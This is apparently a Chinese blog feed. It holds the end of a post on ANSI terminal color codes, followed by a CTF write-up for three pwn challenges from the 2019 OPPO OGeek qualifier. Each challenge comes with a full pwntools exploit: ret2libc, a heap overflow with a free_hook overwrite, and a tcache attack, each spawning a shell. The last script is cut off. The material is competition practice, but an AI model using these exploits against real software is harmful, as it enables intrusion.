class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">echo -e "\e[31mtest\e[41m"                                                语法</span><br><span class="line"></span><br><span class="line">\e[30m 将字符的显示颜色改为黑色 </span><br><span class="line">\e[31m 将字符的显示颜色改为红色 </span><br><span class="line">\e[32m 将字符的显示颜色改为绿色 </span><br><span class="line">\e[33m 将字符的显示颜色改为淡红色 </span><br><span class="line">\e[34m 将字符的显示颜色改为蓝色 </span><br><span class="line">\e[35m 将字符的显示颜色改为紫色 </span><br><span class="line">\e[36m 将字符的显示颜色改为淡蓝色 </span><br><span class="line">\e[37m 将字符的显示颜色改为灰色 </span><br><span class="line"></span><br><span class="line">\e[40m -- \e[47m 设置背景色 </span><br><span class="line">\e[40m 将背景色设置为黑色 </span><br><span class="line">\e[41m 将背景色设置为红色 </span><br><span class="line">\e[42m 将背景色设置为绿色 </span><br><span class="line">\e[43m 将背景色设置为淡红色 </span><br><span class="line">\e[44m 将背景色设置为蓝色 </span><br><span class="line">\e[45m 将背景色设置为紫色 </span><br><span class="line">\e[46m 将背景色设置为淡蓝色 </span><br><span class="line">\e[47m 将背景色设置为灰色</span><br><span class="line"></span><br><span class="line">设置Linux shell的输出效果［字体颜色，样式等］</span><br><span class="line">echo -e "\033[32;49;1m [DONE] \033[39;49;0m"</span><br><span class="line">输出结果     ：[DONE]</span><br><span class="line"></span><br><span class="line">文本终端的颜色可以使用“ANSI非常规字符序列”来生成。举例：</span><br><span class="line">　　echo -e "\033[44;37;5m ME \033[0m COOL"</span><br><span class="line">以上命令设置背景成为蓝色，前景白色，闪烁光标，输出字符“ME”，然后重新设置屏幕到缺省设置，输出字符 “COOL”。“e”是命令 echo 的一个可选项，它用于激活特殊字符的解析器。“\033”引导非常规字符序列。“m”意味着设置属性然后结束非常规字符序列，这个例子里真正有效的字符是 “44;37;5” 和“0”。</span><br><span class="line"></span><br><span class="line">修改“44;37;5”可以生成不同颜色的组合，数值和编码的前后顺序没有关系。可以选择的编码如下所示：</span><br><span class="line">编码    颜色/动作 </span><br><span class="line">0       重新设置属性到缺省设置 </span><br><span class="line">1       设置粗体 </span><br><span class="line">2       设置一半亮度（模拟彩色显示器的颜色） </span><br><span class="line">4       设置下划线（模拟彩色显示器的颜色） </span><br><span class="line">5       设置闪烁 </span><br><span class="line">7       设置反向图象 </span><br><span class="line">22      设置一般密度 </span><br><span class="line">24      关闭下划线 </span><br><span class="line">25      关闭闪烁 </span><br><span class="line">27      关闭反向图象 </span><br><span class="line">30      设置黑色前景 </span><br><span class="line">31      设置红色前景 </span><br><span class="line">32      设置绿色前景 </span><br><span class="line">33      设置棕色前景 </span><br><span class="line">34      设置蓝色前景 </span><br><span class="line">35      设置紫色前景 </span><br><span class="line">36      设置青色前景 </span><br><span class="line">37      设置白色前景 </span><br><span class="line">38      在缺省的前景颜色上设置下划线 </span><br><span class="line">39      在缺省的前景颜色上关闭下划线 </span><br><span class="line">40      设置黑色背景 </span><br><span class="line">41      设置红色背景 </span><br><span class="line">42      设置绿色背景 </span><br><span class="line">43      设置棕色背景 </span><br><span class="line">44      设置蓝色背景 </span><br><span class="line">45      设置紫色背景 </span><br><span class="line">46      设置青色背景 </span><br><span class="line">47      设置白色背景 </span><br><span class="line">49      设置缺省黑色背景</span><br><span class="line"></span><br><span class="line">其他有趣的代码还有：</span><br><span class="line">\033[2J         　清除屏幕 </span><br><span class="line">\033[0q         　关闭所有的键盘指示灯 </span><br><span class="line">\033[1q         　设置“滚动锁定”指示灯 (Scroll Lock) </span><br><span class="line">\033[2q         　设置“数值锁定”指示灯 (Num Lock) </span><br><span class="line">\033[3q         　设置“大写锁定”指示灯 (Caps Lock) </span><br><span class="line">\033[15:40H     把关闭移动到第15行，40列 </span><br><span class="line">\007            　　发蜂鸣生beep</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 id=&quot;Python相关&quot;&gt;&lt;a href=&quot;#Python相关&quot; class=&quot;headerlink&quot; title=&quot;Python相关&quot;&gt;&lt;/a&gt;Python相关&lt;/h2&gt;&lt;div class=&quot;code-area-wr
      
    
    </summary>
    
    
      <category term="常识" scheme="http://yoursite.com/categories/%E5%B8%B8%E8%AF%86/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>CTF-19年OPPO_OGeek_线上赛</title>
    <link href="http://yoursite.com/2019/08/30/CTF-19%E5%B9%B4OPPO_OGeek_%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    <id>http://yoursite.com/2019/08/30/CTF-19%E5%B9%B4OPPO_OGeek_%E7%BA%BF%E4%B8%8A%E8%B5%9B/</id>
    <published>2019-08-30T15:15:43.000Z</published>
    <updated>2019-11-01T11:45:14.000Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="PWN1-babyrop"><a href="#PWN1-babyrop" class="headerlink" title="PWN1 babyrop"></a>PWN1 babyrop</h2><h3 id="第一个read发现溢出一位，刚好覆盖返回值，返回值又作为第二个read的size参数，所以我们可以0xff，使得read打到最大，然后elf-plt-puts来libc-leak，然后ret到main（ret到-libc-start-main会崩溃），然后按照老办法覆盖0xff，第二个read溢出直接ret2libc，执行system-“-bin-sh-x00”"><a href="#第一个read发现溢出一位，刚好覆盖返回值，返回值又作为第二个read的size参数，所以我们可以0xff，使得read打到最大，然后elf-plt-puts来libc-leak，然后ret到main（ret到-libc-start-main会崩溃），然后按照老办法覆盖0xff，第二个read溢出直接ret2libc，执行system-“-bin-sh-x00”" class="headerlink" title="第一个read发现溢出一位，刚好覆盖返回值，返回值又作为第二个read的size参数，所以我们可以0xff，使得read打到最大，然后elf.plt.puts来libc leak，然后ret到main（ret到__libc_start_main会崩溃），然后按照老办法覆盖0xff，第二个read溢出直接ret2libc，执行system(“/bin/sh\x00”)"></a>第一个read发现溢出一位，刚好覆盖返回值，返回值又作为第二个read的size参数，所以我们可以0xff，使得read打到最大，然后elf.plt.puts来libc leak，然后ret到main（ret到__libc_start_main会崩溃），然后按照老办法覆盖0xff，第二个read溢出直接ret2libc，执行system(“/bin/sh\x00”)</h3><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp:"></a>Exp:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("babyrop")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./babyrop")</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">sleep(0.2)</span><br><span class="line">#0x080487CF</span><br><span class="line">pop3_ret = 0x080488f9</span><br><span class="line">sh.send('\x00' + "a" * 6 + "\xff"*4 + "\n")</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.recvuntil("Correct\n")</span><br><span class="line">offset = 0xE7 + 4</span><br><span class="line">payload = offset * 'a'</span><br><span class="line">payload += p32(elf.plt['write'])</span><br><span class="line">payload += p32(pop3_ret)</span><br><span class="line">payload += p32(1)</span><br><span class="line">payload += p32(elf.got['__libc_start_main'])</span><br><span class="line">payload += p32(4)</span><br><span class="line">payload += p32(0x08048825)</span><br><span class="line">#0x08048824</span><br><span class="line">sh.send(payload)</span><br><span class="line">__libc_start_main = u32(sh.recv(4))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">sleep(0.2)</span><br><span class="line">#0x080487CF</span><br><span class="line">pop3_ret = 0x080488f9</span><br><span class="line">sh.send('\x00' + "a" * 6 + "\xff"*4 + "\n")</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.recvuntil("Correct\n")</span><br><span class="line">offset = 0xE7 + 4</span><br><span class="line">payload = offset * 'a'</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(0xdeadbeef)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">sh.send(payload)</span><br><span class="line">log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("47.112.137.238",13337,0)</span><br></pre></td></tr></tbody></table></figure></div><h3 id="Flag-flag-BXCTFKKAZ8-bw-amp-kN"><a href="#Flag-flag-BXCTFKKAZ8-bw-amp-kN" class="headerlink" title="Flag: flag{BXCTFKKAZ8!bw&kN}"></a>Flag: flag{BXCTFKKAZ8!bw&kN}</h3><h2 id="PWN2-bookmanage"><a href="#PWN2-bookmanage" class="headerlink" title="PWN2 bookmanage"></a>PWN2 bookmanage</h2><h3 id="发现edit功能有明显的堆溢出，无论你堆块申请什么都是read-input-chunk-list-0x100-，而且没有末尾置0，所以可以先free一个unsorted-bin，然后连接字符串到libc，然后show就可以看到libc了，然后再edit复原，复原的同时覆盖bk为free-hook-–-0x50，造出一个0x7f的fastbin的size位，然后再申请一个0x68的fastbin，并free掉，通过edit功能修改fd位为0x7f的size的fake-chunk处，即可覆盖free-hook为system，然后同时保证一个堆块是-bin-sh-x00的字符串即可拿到shell"><a href="#发现edit功能有明显的堆溢出，无论你堆块申请什么都是read-input-chunk-list-0x100-，而且没有末尾置0，所以可以先free一个unsorted-bin，然后连接字符串到libc，然后show就可以看到libc了，然后再edit复原，复原的同时覆盖bk为free-hook-–-0x50，造出一个0x7f的fastbin的size位，然后再申请一个0x68的fastbin，并free掉，通过edit功能修改fd位为0x7f的size的fake-chunk处，即可覆盖free-hook为system，然后同时保证一个堆块是-bin-sh-x00的字符串即可拿到shell" class="headerlink" title="发现edit功能有明显的堆溢出，无论你堆块申请什么都是read_input(chunk_list,0x100)，而且没有末尾置0，所以可以先free一个unsorted bin，然后连接字符串到libc，然后show就可以看到libc了，然后再edit复原，复原的同时覆盖bk为free_hook – 0x50，造出一个0x7f的fastbin的size位，然后再申请一个0x68的fastbin，并free掉，通过edit功能修改fd位为0x7f的size的fake_chunk处，即可覆盖free_hook为system，然后同时保证一个堆块是/bin/sh\x00的字符串即可拿到shell"></a>发现edit功能有明显的堆溢出，无论你堆块申请什么都是read_input(chunk_list,0x100)，而且没有末尾置0，所以可以先free一个unsorted bin，然后连接字符串到libc，然后show就可以看到libc了，然后再edit复原，复原的同时覆盖bk为<strong>free_hook – 0x50，造出一个0x7f的fastbin的size位，然后再申请一个0x68的fastbin，并free掉，通过edit功能修改fd位为0x7f的size的fake_chunk处，即可覆盖</strong>free_hook为system，然后同时保证一个堆块是/bin/sh\x00的字符串即可拿到shell</h3><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp:"></a>Exp:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("bookmanager")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def createName(name):</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">def addChapter(name):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">def addSection(name,content):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">sh.recvuntil("0x")</span><br><span class="line">data = int(sh.recvuntil("\n",True),16)</span><br><span class="line">sh.send(content)</span><br><span class="line">return data</span><br><span class="line">def addText(s,size,name):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(s)</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">return name</span><br><span class="line">def freeChapter(name):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">def freeSection(name):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("5")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">def freeText(name):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("6")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">def show():</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.send("7")</span><br><span class="line">def edit(s,name,content):</span><br><span class="line">type_list = ['Chapter','Section','Text']</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("8")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(type_list[s])</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./bookmanager")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">createName("fuckyou")</span><br><span class="line">addChapter("\x11" * 0x10)</span><br><span class="line">addSection('\x11' * 0x10,'\x12' * 0x10)</span><br><span class="line">addText("\x12" * 0x10,0x68,'\x13' * 0x18)</span><br><span class="line">addChapter('\x21' * 0x10)</span><br><span class="line">addSection("\x21" * 0x10,'\x22' * 0x10)</span><br><span class="line">addText('\x22' * 0x10,0x18,'\x23' * 0x18)</span><br><span class="line">freeText('\x22' * 0x10)</span><br><span class="line">addText('\x22' * 0x10,0x68,'\x24' * 0x10)</span><br><span class="line">freeChapter('\x21' * 0x10)</span><br><span class="line">freeSection('\x22' * 0x10)</span><br><span class="line">freeText('\x12' * 0x10)</span><br><span class="line">payload = '\x14' * 0x68</span><br><span class="line">payload += '\x14' * 8</span><br><span class="line">addText('\x12' * 0x10,0x68,payload)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(payload)</span><br><span class="line">main_arena = u64(sh.recv(6).ljust(8,'\x00')) - 88</span><br><span class="line">libc = main_arena - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">payload = '\x14' * 0x68</span><br><span class="line">payload += p64(0x91)</span><br><span class="line">payload += p64(main_arena + 88) + p64(__free_hook - 0x40 - 0x10)</span><br><span class="line">payload += '\x00' * 0x70</span><br><span class="line">payload += p64(0x90)</span><br><span class="line">payload += p64(0x40)</span><br><span class="line">edit(2,'\x12' * 0x10,payload)</span><br><span class="line">addChapter('\x21' * 0x10)</span><br><span class="line">addSection("\x21" * 0x10,'/bin/sh\x00')</span><br><span class="line"></span><br><span class="line">addText("\x12" * 0x10,0x18,'\x25' * 0x10)</span><br><span class="line">payload = '\x25' * 0x18 + p64(0x71) + p64(__free_hook - 0x43) * 2</span><br><span class="line">payload += p64(0) * 10 + p64(0) + p64(0x20cd1)</span><br><span class="line">edit(2,'\x12' * 0x10,payload)</span><br><span class="line">addText("\x12" * 0x10,0x68,'\x16' * 0x68)</span><br><span class="line">payload = '\x00' *3</span><br><span class="line">payload += p64(0) * 6 + p64(system)</span><br><span class="line">addText("\x12" * 0x10,0x68,"\n")</span><br><span class="line">edit(2,'\x12' * 0x10,payload)</span><br><span class="line">freeSection('/bin/sh\x00')</span><br><span class="line">#addText("\x12" * 0x10,0x68,'\x15' * 0x10)</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("main_arena: " + hex(main_arena))</span><br><span class="line">#x/50gx (long long)(&__free_hook) - 0x60</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("47.112.115.30",13337,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="PWN3-hub"><a href="#PWN3-hub" class="headerlink" title="PWN3 hub"></a>PWN3 hub</h2><h3 id="程序逻辑很简单，就是malloc、free、edit8个字节，但是free功能可以堆块任意地址free，先测试一下tcache攻击的poc，因为我不知道远程是否为libc2-27，然后经过测试是2-27的libc。首先申请一个0xa8的堆块把堆地址抬到0x300低位，且将0xa8的堆块double-free后期会用到，然后开始申请申请一个0x80的堆块，然后再申请一个0x8的堆块，然后tcache-attack，覆盖低位地址打回0x80的地址，然后free8次，即可libc-leak。"><a href="#程序逻辑很简单，就是malloc、free、edit8个字节，但是free功能可以堆块任意地址free，先测试一下tcache攻击的poc，因为我不知道远程是否为libc2-27，然后经过测试是2-27的libc。首先申请一个0xa8的堆块把堆地址抬到0x300低位，且将0xa8的堆块double-free后期会用到，然后开始申请申请一个0x80的堆块，然后再申请一个0x8的堆块，然后tcache-attack，覆盖低位地址打回0x80的地址，然后free8次，即可libc-leak。" class="headerlink" title="程序逻辑很简单，就是malloc、free、edit8个字节，但是free功能可以堆块任意地址free，先测试一下tcache攻击的poc，因为我不知道远程是否为libc2.27，然后经过测试是2.27的libc。首先申请一个0xa8的堆块把堆地址抬到0x300低位，且将0xa8的堆块double free后期会用到，然后开始申请申请一个0x80的堆块，然后再申请一个0x8的堆块，然后tcache attack，覆盖低位地址打回0x80的地址，然后free8次，即可libc leak。"></a>程序逻辑很简单，就是malloc、free、edit8个字节，但是free功能可以堆块任意地址free，先测试一下tcache攻击的poc，因为我不知道远程是否为libc2.27，然后经过测试是2.27的libc。首先申请一个0xa8的堆块把堆地址抬到0x300低位，且将0xa8的堆块double free后期会用到，然后开始申请申请一个0x80的堆块，然后再申请一个0x8的堆块，然后tcache attack，覆盖低位地址打回0x80的地址，然后free8次，即可libc leak。</h3><p>然后利用已有堆块上的libc地址，tcache attack攻击<strong>free_hook，注意这里会有一位数字不知道，也就是4个位即16分之一的概率bypass，然后edit为elf.plt.puts，这样在申请一个0x80的堆块再free即可libc leak，这样就知道了system的地址和</strong>free_hook的地址，然后利用一开始的0xa8堆块的double free，tcache attack到__free_hook并覆盖为system，然后申请一个堆块，edit为/bin/sh\x00，然后free，即可执行system(“/bin/sh\x00”)</p><h3 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp:"></a>Exp:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("hub_2bcab892e2e5b54edbef4ccecd6f373f")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size):</span><br><span class="line">    sh.recvuntil(">>")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil("?")</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.recvuntil(">>")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil("?")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">def edit(content):</span><br><span class="line">    sh.recvuntil(">>")</span><br><span class="line">    sh.sendline("3")</span><br><span class="line">    sh.recvuntil("?")</span><br><span class="line">    sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            if(debug == 1):</span><br><span class="line">                sh = process("./hub_2bcab892e2e5b54edbef4ccecd6f373f")</span><br><span class="line">                lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">            else:</span><br><span class="line">                sh = remote(ip,port)</span><br><span class="line">                lib = ELF("libc.so.6")</span><br><span class="line">            add(0xa8)</span><br><span class="line">            free(0)</span><br><span class="line">            free(0)</span><br><span class="line">            add(0x80)</span><br><span class="line">            add(0x8)</span><br><span class="line">            for i in range(8):</span><br><span class="line">                free(-0x90)</span><br><span class="line">            add(0x98)</span><br><span class="line">            free(0)</span><br><span class="line">            free(0)</span><br><span class="line">            add(0x98)</span><br><span class="line">            edit('\x10')</span><br><span class="line">            add(0x98)</span><br><span class="line">            add(0x98)</span><br><span class="line">            if debug != 0:</span><br><span class="line">                log.success("pid = " + str(sh.pid))</span><br><span class="line">            #data = input()</span><br><span class="line">            #edit(chr(data%0x100) + chr(data>>8))</span><br><span class="line">            edit('\xe8\x88')</span><br><span class="line">            add(0x80)</span><br><span class="line">            add(0x80)</span><br><span class="line">            edit(p64(elf.plt['puts']))</span><br><span class="line">            add(0x80)</span><br><span class="line">            free(0)</span><br><span class="line">            __free_hook = u64(sh.recvuntil("\x7f",timeout = 1)[-6:].ljust(8,'\x00'))</span><br><span class="line">            libc = __free_hook - lib.symbols['__free_hook']</span><br><span class="line">            system = libc + lib.symbols['system']</span><br><span class="line">            if(__free_hook <= 0):</span><br><span class="line">                        sh.close()</span><br><span class="line">                        continue</span><br><span class="line">            #edit(p64(0xdeadbeef))</span><br><span class="line">            #x/50gx &__malloc_hook</span><br><span class="line">            #x/50gx &__free_hook</span><br><span class="line">            #gdb.attach(sh</span><br><span class="line">            #0x400A49</span><br><span class="line">            break</span><br><span class="line">        except 